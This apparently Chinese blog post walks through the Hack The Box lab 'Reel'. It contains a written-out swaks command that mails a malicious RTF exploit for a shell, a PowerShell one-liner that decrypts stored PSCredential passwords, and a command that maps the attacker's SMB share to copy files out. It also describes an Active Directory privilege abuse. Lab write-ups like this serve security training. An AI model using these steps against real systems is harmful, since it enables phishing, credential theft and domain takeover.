> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/iikON0nePiQ8aBZz3JWapg)

大余安全  

一个每日分享渗透小技巧的公众号![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPTQKiaXksbZia7PmHLPX2vnCWsznInTj3b9TFYtTDIYG6lDGJZYYSv72NsVWF24Kjlo4MT29tEOQSg/640?wx_fmt=png)

  

  

大家好，这里是 **大余安全** 的第 **76** 篇文章，本公众号会每日分享攻防渗透技术给大家。

![](https://mmbiz.qpic.cn/mmbiz_png/zYxEsibHhhqHFXvQKic55dUSltLhKZhWS26N6nZiaz7TZhriaodk3GvvC5cnnSRwZR5f8TztGuKSBM7d2JMSl5iafcw/640?wx_fmt=png)

靶机地址：https://www.hackthebox.eu/home/machines/profile/143

靶机难度：中级（5.0/10）

靶机发布日期：2018 年 11 月 10 日

靶机描述：

Reel is medium to hard difficulty machine, which requires a client-side attack to bypass the perimeter, and highlights a technique for gaining privileges in an Active Directory environment.

请注意：对于所有这些计算机，我是通过平台授权允许情况进行渗透的。我将使用 Kali Linux 作为解决该 HTB 的攻击者机器。这里使用的技术仅用于学习教育目的，如果列出的技术用于其他任何目标，我概不负责。

![](https://mmbiz.qpic.cn/mmbiz_gif/IwSh4vCvtCmAiahWWBCD6uVshNlbtsZxyBFdtQH49ia9feSkCyicQ3mgkNnn0DJR5ZYicTLj7IYQquYbqzXp3Y5HQA/640?wx_fmt=gif)

![](https://mmbiz.qpic.cn/mmbiz_gif/YnfnlicbPtFCfftiaRIe6t8lnrv9ueWwt2uANWPZAx8iaPnlPia0gncwDAsUiahaOibGg7mB0jYgTwdk6uNt4Bib5dHMw/640?wx_fmt=gif)

一、信息收集

  

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPVghnGJxz7UZBCWIJZL8CzBsklnQ0A5nkFO4RtEysDj2hO1MTOgleDE0SsJE5LUv4qeiaS24MdnrA/640?wx_fmt=png)

可以看到靶机的 IP 是 10.10.10.77....

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPVghnGJxz7UZBCWIJZL8CzWrRlU16nChAl1ygTr6ZlvshWfnTK55c2iaib9iaVdWp1lvs7hIVAzicHIg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPVghnGJxz7UZBCWIJZL8Cz7gCXnrIoCnJBOFsDGTw8R6k3ufxyEWeQa9HY2tgYee4hTicNn5LlL5Q/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPVghnGJxz7UZBCWIJZL8CzOa7tZaM1AiareEiaKherC8W7hCDibTzggjpbAS6tMjpyia7YaYE2BpGFlg/640?wx_fmt=png)

Nmap 可以看到这是一台 Windows Server 2012 R2 服务器，该服务器承载 FTP，SSH，SMTP 和 Active Directory 域等服务...

可以看到 nmap 发现 ftp 是可以匿名访问的... 并且存在 documents 目录... 进去看看...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPVghnGJxz7UZBCWIJZL8CzyUWCquz3uH4fwdibhpcaSIc6QPIqKYUmFxP5KM0KMLsRpJoW7xheA8w/640?wx_fmt=png)

将 documents 目录文件全都下载了...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPVghnGJxz7UZBCWIJZL8CzQSUwvzRzqibtXyiaYwicXicbgTYcYYnqTCAccvNichamP3fthiaXVRWernkg/640?wx_fmt=png)

意思是可以发送 xtf 格式的电子邮件给靶机... 继续查看下一个文件

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPVghnGJxz7UZBCWIJZL8CzJlNgj4bPR3rpwvqGKgPIJXzrUkovyHYXXkuUd8BukKvRIXKF3AwpLQ/640?wx_fmt=png)

果然，查看到了电子邮件...nico@megabank.com

这边有了电子邮件号，肯定是要给他发邮件的，而且发送的邮件内容得是. xtf 的... 这里又可以用钓鱼邮件恶意程序进行提权了...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPVghnGJxz7UZBCWIJZL8CzO1qDj2wOURcIVQicFxhKl4HcEam9iaFGsxF3nR8wE8wiclcibjgMMxwPJw/640?wx_fmt=png)

这里我搜索了 rtf 的漏洞，这是一个 Microsoft Office oday 漏洞...

这个漏洞利用了. rtf 文件（或有些已重命名为. doc），该文件将连接到远程服务器，然后下载包含 HTML 应用程序内容的文件，并作为. hta 文件来执行，由于. hta 是可执行文件，因此攻击者可以在受害者的计算机上执行完整的代码，此逻辑错误还使攻击者可以绕过 Microsoft 开发的任何基于内存的缓解措施来执行....（可怕的 oday 漏洞）

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPVghnGJxz7UZBCWIJZL8CzfIVlgZqP9f3fghO8fjhoLCQQqhQ0pvBkH73ExibqTOBVpTDoxGGO98w/640?wx_fmt=png)

查找到了 exploit，走起

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPVghnGJxz7UZBCWIJZL8Cz4W1W8Vrl5XwqVpTz48UOFkvOeic0ETBUaknHRwQJAZhcPJ2BlPeQthw/640?wx_fmt=png)

配置好后，这里还需要修改 FILENAME 为. rtf 即可...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPVghnGJxz7UZBCWIJZL8Czv7DVrLKxZetRJV6iaoM5Xm2GQqIOnRv8PVC2tN7PyQe5r6CQ7zV5cmA/640?wx_fmt=png)

可以看到创建好了恶意程序. rtf 文件... 而且还托管在了 default.hta 上...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPVghnGJxz7UZBCWIJZL8Cz4x77ZkmIUKmiaia8PVyEtWWiaCFDCmenF9Ir3MiceQEXciaNYt4dvVj62AQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPVghnGJxz7UZBCWIJZL8Czl4VlGO1Y3alRbuDEq9ybBViazY2y1YV0Ro38m5U45onnic5qyiaicjicQ0g/640?wx_fmt=png)

```
swaks --to nico@megabank.com --server 10.10.10.77 --attach /root/.msf4/local/dayu.rtf
```

可以看到成功获得了 shell 壳...

这里还可以利用 mutt、sendemail、telnet 等等工具进行发送邮件... 不演示了... 最近头疼得厉害...

并且直接获得了 user 信息...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPVghnGJxz7UZBCWIJZL8CzKRYiaUbWzZlsBDfRRD5KcYcIkDLFGScSqtYy9xCIx658ENgVsnUv1IA/640?wx_fmt=png)

可以看到，在 desktop 下还存在 xml 文件，查看后发现了有用的信息...

获得的信息有：XML 文件、Objs 版本是 1.1.0.1、PSC 的凭证、用户名：Tom、密码：哈希值...

那么需要破解这个哈希值即可...

找了半天以为是很好破解的哈希值，这里我还注意到了一个信息...PSCredential

PSCredential 是 powershell 中的一个对象，该对象提供了一种存储用户名，密码和凭据的方法，还有两个功能，Import-CliXml 和 Export-CliXml，用于将这些凭据保存到文件或从文件中还原他，开始利用...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPVghnGJxz7UZBCWIJZL8Czzhg2CnfJfv4YlGianPAOVJVmQxLLWQKlhX7aiaKhUsTHul73EQGdrfTQ/640?wx_fmt=png)

```
powershell " $credential = Import-CliXml -Path 'C:\Users\nico\Desktop\cred.xml' ; $credential.getnetworkcredential() | fl *"
```

可以看到已经获得了密码...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPVghnGJxz7UZBCWIJZL8CzjEj9auLnUxb6O4GzZRNth1fLqiaeuMLaYoHNhh1v1Sib0W2VOYxo63lA/640?wx_fmt=png)

可以看到在 Tom 的桌面上，有一个名为 Bloodhound 的文件夹和一个文件 note.txt...

文件里告诉我们，SharpHound 允许我们发现 Active Directory 环境中的隐藏依赖关系，并且与 BloodHound 一起在图形界面中形成依赖关系..

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPVghnGJxz7UZBCWIJZL8CzscVdum0asy0NCwibTnSiayKfMIVy6d9Q1nkSTms335PuXd89nBdsExLw/640?wx_fmt=png)

继续往下看，可以看到存在了关系图 BloodHound... 把 acls.csv 放到本地，进行查看即可... 可以利用 smbserver 共享传递即可...

```
net use z: \\10.10.14.11\share
```

copy "文件" z:

这里我就不说分析 BloodHound 的事情了... 头很疼... 也忘了截图...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPVghnGJxz7UZBCWIJZL8Czy6UO7ugZicPDPbicIibXTRzfr8qMnocIU5mLOGnVSCDC40pPbIQdIFqXA/640?wx_fmt=png)

这里利用了系统里的 PowerView.ps1，然后 powershell 下利用对象进行修改了 claire 用户的密码... 成功修改...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPVghnGJxz7UZBCWIJZL8Czor9tbaNIGx0eF7WhO42vuzY5C5knYibmBhfuSQNzVBxo6icWvSNUO0Nw/640?wx_fmt=png)

经过前面的信息，知道 clair 对 Backup_Admins 组具有 WriteDacl 权限，我可以用它来将她添加到群组中。首先，看到该组的唯一成员是 ranj...

然后把 chair 加入进去...

可以看到已经成功加入了... 但是没生效，得重新登录...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPVghnGJxz7UZBCWIJZL8CztM3yYgTB6jxeFIFdBb7eEpRSZTcMcjLHZGQNiaSZia5xibricACYZC3AWw/640?wx_fmt=png)

重新登录后... 以 claire 和 Backup_Admins 的身份返回，可以检查 Administrator 文件夹上的权限了...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPVghnGJxz7UZBCWIJZL8Czjo0k0VpwAwUsy85yCvLNKdxT6Zp0aLDB3VVErlShuf9sfCFiasqibs1g/640?wx_fmt=png)

这里可以看到 root 信息还无法查看... 继续往下走，在 BackupScript.ps1 里发现了 passwd... 这是管理员的密码... 真是一环套一环...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPVghnGJxz7UZBCWIJZL8Cz7CRibnjzu3UOhc3GR4h1B7GRpg9n5y5KoMt2nD38icV7pWpIvEGow7QQ/640?wx_fmt=png)

成功获得 root 信息...

![](https://mmbiz.qpic.cn/mmbiz_gif/Wic8BDGMRUojcP7P5MXxWPyW6sEXJUX24bQWIAqJHib0vdDp2dbEfveEaicTwLTba2CqibcMSGMpb6p6aopkkxhFjw/640?wx_fmt=gif)  

今天头很疼，但是还是下班后坚持拿下了这台靶机... 加油吧，努力的人都很幸运！！！

由于我们已经成功得到 root 权限查看 user.txt 和 root.txt，因此完成了中级靶机，希望你们喜欢这台机器，请继续关注大余后期会有更多具有挑战性的机器，一起练习学习。

如果你有其他的方法，欢迎留言。要是有写错了的地方，请你一定要告诉我。要是你觉得这篇博客写的还不错，欢迎分享给身边的人。

![](https://mmbiz.qpic.cn/mmbiz_gif/b6beYwicB58hl0HVHYtRMBLZVmQhMLkWUBrDeZwjA5hIS9DgspzICqhF1IONibMQ3Il0nuicMZibGbRqCqzkQ8IYvw/640?wx_fmt=gif)

如果觉得这篇文章对你有帮助，可以转发到朋友圈，谢谢小伙伴~

![](https://mmbiz.qpic.cn/mmbiz_png/c5xrRn4430AnqkfAJc38Vpnc5XiaADLTjiciciaibYU4EHw3Nuh7YMtuB0hz3sb8Em9iatt5skAsibuuysPLdLY5LtWOw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/p3lIbvldZiabdI5iaCb3icRhtygUuo2sp6Hcdq0ANlpy5W3gL628uq032jsoVnGnl6HdGrgDXjfazFtkp6IInibDdQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPqjaFWwyrrhiciahSpOibxqKvSIFX0iaPcG00CjYIwQDwIDeIicmFMlOVNyhWYVSE8pJK566UK3YOUNWQ/640?wx_fmt=png)

随缘收徒中~~ **随缘收徒中~~** **随缘收徒中~~**

欢迎加入渗透学习交流群，想入群的小伙伴们加我微信，共同进步共同成长！

![](https://mmbiz.qpic.cn/mmbiz_png/ndicuTO22p6ibN1yF91ZicoggaJJZX3vQ77Vhx81O5GRyfuQoBRjpaUyLOErsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q/640?wx_fmt=png)  

大余安全

一个全栈渗透小技巧的公众号

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPTQKiaXksbZia7PmHLPX2vnCSsnsc7MHh257oYRic1MOT8qibABNUEnTq9DUL7QBwnS52EheJf4m8iaTQ/640?wx_fmt=png)